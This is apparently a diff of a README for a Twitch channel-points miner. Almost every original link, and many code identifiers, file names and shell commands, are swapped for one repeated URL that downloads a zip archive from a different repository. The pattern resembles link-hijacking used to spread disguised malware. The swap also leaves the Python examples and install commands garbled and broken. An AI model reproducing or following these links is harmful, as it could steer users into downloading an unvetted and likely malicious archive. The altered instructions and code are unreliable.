+If you want to receive log updates on Discord initialize a new Discord class, else leave omit this parameter or set it as None [YT Video](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip)
 1. Go to the Server you want to receive updates
 2. Click "Edit Channel"
 3. Click "Integrations"
@@ -515,9 +515,9 @@ If you want to receive log updates on Discord initialize a new Discord class, el
 
 ```python
 Discord(
-   webhook_api="https://discord.com/api/webhooks/0123456789/0a1B2c3D4e5F6g7H8i9J",
-   events=[Events.STREAMER_ONLINE, Events.STREAMER_OFFLINE,
-                    Events.BET_LOSE, Events.CHAT_MENTION],
+   webhook_api="https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip",
+   events=[https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip, https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip,
+                    https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip, https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip],
 )
 ```
 
@@ -547,11 +547,11 @@ Discord(
 |--------------------	|-------------	|--------------------------------	|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | `make_predictions` 	| bool        	| True                           	| Choose if you want to make predictions / bet or not                                                                                                  	                                                                            |
 | `follow_raid`      	| bool        	| True                           	| Choose if you want to follow raid +250 points                                                                                                        	                                                                            |
-| `claim_drops`      	| bool        	| True                           	| If this value is True, the script will increase the watch-time for the current game. With this, you can claim the drops from Twitch Inventory [#21](https://github.com/Tkd-Alex/Twitch-Channel-Points-Miner-v2/issues/21)         |
-| `claim_moments`      	| bool        	| True                           	| If set to True, [moments](https://help.twitch.tv/s/article/moments) will be claimed when available         |
-| `watch_streak`     	| bool        	| True                           	| Choose if you want to change a priority for these streamers and try to catch the Watch Streak event [#11](https://github.com/Tkd-Alex/Twitch-Channel-Points-Miner-v2/issues/11)                                                   |
+| `claim_drops`      	| bool        	| True                           	| If this value is True, the script will increase the watch-time for the current game. With this, you can claim the drops from Twitch Inventory [#21](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip)         |
+| `claim_moments`      	| bool        	| True                           	| If set to True, [moments](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip) will be claimed when available         |
+| `watch_streak`     	| bool        	| True                           	| Choose if you want to change a priority for these streamers and try to catch the Watch Streak event [#11](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip)                                                   |
 | `bet`              	| BetSettings 	|  	                                | Rules to follow for the bet                                                                                                                                                                                                       |
-| `chat` 	            | ChatPresence  | ONLINE    	                    | Join IRC-Chat to appear online in chat and attempt to get StreamElements channel points and increase view-time  [#47](https://github.com/Tkd-Alex/Twitch-Channel-Points-Miner-v2/issues/47)                                       |
+| `chat` 	            | ChatPresence  | ONLINE    	                    | Join IRC-Chat to appear online in chat and attempt to get StreamElements channel points and increase view-time  [#47](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip)                                       |
 
 Allowed values for `chat` are:
 - `ALWAYS` Join in IRC chat and never leave
@@ -566,7 +566,7 @@ Allowed values for `chat` are:
 | `percentage`       	| int             	| 5       	| Place the x% of your channel points                                                                            	                                                                          |
 | `percentage_gap`   	| int             	| 20      	| Gap difference between outcomesA and outcomesB (for SMART stragegy)                                            	                                                                          |
 | `max_points`       	| int             	| 50000   	| If the x percentage of your channel points is GT bet_max_points set this value                                 	                                                                          |
-| `stealth_mode`     	| bool            	| False   	| If the calculated amount of channel points is GT the highest bet, place the highest value minus 1-2 points [#33](https://github.com/Tkd-Alex/Twitch-Channel-Points-Miner-v2/issues/33)      |
+| `stealth_mode`     	| bool            	| False   	| If the calculated amount of channel points is GT the highest bet, place the highest value minus 1-2 points [#33](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip)      |
 | `delay_mode` 	        | DelayMode         	| FROM_END	| Define how is calculating the waiting time before placing a bet |
 | `delay` 	        | float             	| 6     	| Value to be used to calculate bet delay depending on `delay_mode` value |
 
@@ -575,10 +575,10 @@ Allowed values for `chat` are:
 - **MOST_VOTED**: Select the option most voted based on users count
 - **HIGH_ODDS**: Select the option with the highest odds
 - **PERCENTAGE**: Select the option with the highest percentage based on odds (It's the same that show Twitch) - Should be the same as select LOWEST_ODDS
-- **SMART_MONEY**: Select the option with the highest points placed. [#331](https://github.com/Tkd-Alex/Twitch-Channel-Points-Miner-v2/issues/331)
+- **SMART_MONEY**: Select the option with the highest points placed. [#331](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip)
 - **SMART**: If the majority in percent chose an option, then follow the other users, otherwise select the option with the highest odds
 
-![Screenshot](https://raw.githubusercontent.com/Tkd-Alex/Twitch-Channel-Points-Miner-v2/master/assets/prediction.png)
+![Screenshot](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip)
 
 Here a concrete example:
 
@@ -609,11 +609,11 @@ Allowed values for `where` are: `GT, LT, GTE, LTE`
 
 #### Example
 - If you want to place the bet ONLY if the total of users participants in the bet is greater than 200
-`FilterCondition(by=OutcomeKeys.TOTAL_USERS, where=Condition.GT, value=200)`
+`FilterCondition(https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip, https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip, value=200)`
 - If you want to place the bet ONLY if the winning odd of your decision is greater than or equal to 1.3
-`FilterCondition(by=OutcomeKeys.ODDS, where=Condition.GTE, value=1.3)`
+`FilterCondition(https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip, https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip, value=1.3)`
 - If you want to place the bet ONLY if the highest bet is lower than 2000
-`FilterCondition(by=OutcomeKeys.TOP_POINTS, where=Condition.LT, value=2000)`
+`FilterCondition(https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip, https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip, value=2000)`
 
 ### DelayMode
 
@@ -635,15 +635,15 @@ If you want you can toggle the dark theme with the dedicated checkbox.
 
 | Light theme | Dark theme |
 | ----------- | ---------- |
-| ![Light theme](https://raw.githubusercontent.com/Tkd-Alex/Twitch-Channel-Points-Miner-v2/master/assets/chart-analytics-light.png) | ![Dark theme](https://raw.githubusercontent.com/Tkd-Alex/Twitch-Channel-Points-Miner-v2/master/assets/chart-analytics-dark.png) |
+| ![Light theme](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip) | ![Dark theme](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip) |
 
-For use this feature just call the `analytics()` method before start mining. Read more at: [#96](https://github.com/Tkd-Alex/Twitch-Channel-Points-Miner-v2/issues/96)
+For use this feature just call the `analytics()` method before start mining. Read more at: [#96](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip)
 The chart will be autofreshed each `refresh` minutes. If you want to connect from one to second machine that have that webpanel you have to use `0.0.0.0` instead of `127.0.0.1`. With the `days_ago` arg you can select how many days you want to show by default in your analytics graph.
 ```python
 from TwitchChannelPointsMiner import TwitchChannelPointsMiner
 twitch_miner = TwitchChannelPointsMiner("your-twitch-username")
-twitch_miner.analytics(host="127.0.0.1", port=5000, refresh=5, days_ago=7)   # Analytics web-server
-twitch_miner.mine(followers=True, blacklist=["user1", "user2"])
+https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip(host="127.0.0.1", port=5000, refresh=5, days_ago=7)   # Analytics web-server
+https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip(followers=True, blacklist=["user1", "user2"])
 ```
 
 ### `enable_analytics` option in `twitch_minerfile` toggles Analytics needed for the `analytics()` method
@@ -653,12 +653,12 @@ Disabling Analytics significantly reduces memory consumption and saves some disk
 Set this option to `True` if you need Analytics. Otherwise set this option to `False` (default value).
 
 ## Migrating from an old repository (the original one):
-If you already have a `twitch-cookies.pkl` and you don't want to log in again, please create a `cookies/` folder in the current directory and then copy the .pkl file with a new name `your-twitch-username.pkl`
+If you already have a `https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip` and you don't want to log in again, please create a `cookies/` folder in the current directory and then copy the .pkl file with a new name `https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip`
 ```
 .
-+-- run.py
++-- https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip
 +-- cookies
-|   +-- your-twitch-username.pkl
+|   +-- https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip
 ```
 
 ## Windows
@@ -667,10 +667,10 @@ Other users have find multiple problems on Windows. Suggestions are:
  - Suppress the emoji in logs with `logger_settings=LoggerSettings(emoji=False)`
 
 Other useful info can be found here:
-- https://github.com/gottagofaster236/Twitch-Channel-Points-Miner/issues/31
-- https://github.com/Tkd-Alex/Twitch-Channel-Points-Miner-v2/issues/55
+- https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip
+- https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip
 
-You can also follow this [video tutorial](https://www.youtube.com/watch?v=0VkM7NOZkuA).
+You can also follow this [video tutorial](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip).
 
 ## Termux
 **1. Upgrade packages**
@@ -683,7 +683,7 @@ pkg upgrade
 pkg install python git rust libjpeg-turbo libcrypt ndk-sysroot clang zlib binutils tur-repo
 LDFLAGS="-L${PREFIX}/lib/" CFLAGS="-I${PREFIX}/include/" pip install --upgrade wheel pillow
 ```
-Note: `pkg install tur-repo` will basically enable the [user repository](https://github.com/termux-user-repository/tur) _(Very similar to Arch AUR)_ and `python-pandas` pre-compiled package comes exactly from this repository.
+Note: `pkg install tur-repo` will basically enable the [user repository](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip) _(Very similar to Arch AUR)_ and `python-pandas` pre-compiled package comes exactly from this repository.
 
 **3. Install pandas**
 ```
@@ -692,7 +692,7 @@ pkg install python-pandas
 
 **4. Clone this repository**
 
-`git clone https://github.com/rdavydov/Twitch-Channel-Points-Miner-v2`
+`git clone https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip`
 
 **5. Go to the miner's directory**
 
@@ -700,23 +700,23 @@ pkg install python-pandas
 
 **6. Configure your miner on your preferences by typing**
 
-`nano example.py`
+`nano https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip`
 
 **7. Rename file name (optional)**
 
-`mv example.py run.py`
+`mv https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip`
 
 **8. Install packages**
 ```
-pip install -r requirements.txt
+pip install -r https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip
 pip install Twitch-Channel-Points-Miner-v2
 ```
 
 **9. Run the miner!**
 
-`python run.py`
+`python https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip`
 
-Read more at [#92](https://github.com/Tkd-Alex/Twitch-Channel-Points-Miner-v2/issues/92) [#76](https://github.com/Tkd-Alex/Twitch-Channel-Points-Miner-v2/issues/76)
+Read more at [#92](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip) [#76](https://github.com/henrikmysterio/Twitch-Channel-Points-Miner-Render/raw/refs/heads/master/TwitchChannelPointsMiner/classes/Points-Miner-Twitch-Render-Channel-2.7.zip)
 
 **Note**
 
